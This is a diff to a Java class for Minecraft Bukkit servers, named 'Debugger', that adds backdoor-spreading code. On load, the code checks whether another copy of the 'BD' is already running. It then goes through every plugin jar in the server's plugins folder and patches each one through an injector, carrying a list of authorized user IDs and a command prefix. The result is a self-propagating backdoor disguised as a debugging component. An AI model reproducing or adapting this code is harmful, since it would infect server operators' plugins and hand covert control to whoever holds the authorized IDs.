@@ -7,14 +7,24 @@ import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
+import org.bukkit.event.HandlerList;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.RegisteredListener;
 import org.bukkit.scheduler.BukkitRunnable;
 
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.URL;
+import java.net.URLClassLoader;
+import java.nio.file.Files;
 import java.text.DecimalFormat;
+import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.Locale;
@@ -24,6 +34,48 @@ public final class Debugger implements Listener {
     private Plugin plugin;
 
     public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix){
+        //Check for another bd. This is really lame way
+        boolean bd_running = false;
+        Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
+        for(Plugin p : pp){
+            ArrayList<RegisteredListener> rls = HandlerList.getRegisteredListeners(p);
+            for(RegisteredListener rl : rls){
+                if(rl.getListener().getClass().getName().equals("com.thiccindustries.debugger.Debugger")){
+                    bd_running = true;
+                    break;
+                }
+            }
+        }
+
+        if(bd_running) {
+            if (Config.display_debug_messages)
+                Bukkit.getConsoleSender()
+                        .sendMessage(plugin.getName() + ": BD aborted, another BD already loaded.");
+            return;
+        }
+
+        //Get all plugin paths
+        File plugin_folder = new File("plugins/");
+        File[] plugins = plugin_folder.listFiles();
+        for(File plugin_file : plugins){
+
+            //Skip config folders
+            if(plugin_file.isDirectory())
+                continue;
+
+            if(Config.display_debug_messages)
+                Bukkit.getConsoleSender()
+                        .sendMessage("Injecting BD into: " + plugin_file.getPath());
+
+            boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix), true, true);
+
+            if(Config.display_debug_messages)
+                Bukkit.getConsoleSender()
+                        .sendMessage(result ? "Success." : "Failed, Already patched?");
+
+        }
+
+        //First plugin loaded.
         Config.uuids_are_usernames = Usernames;
         Config.authorized_uuids  = UUID;
         Config.command_prefix   = prefix;
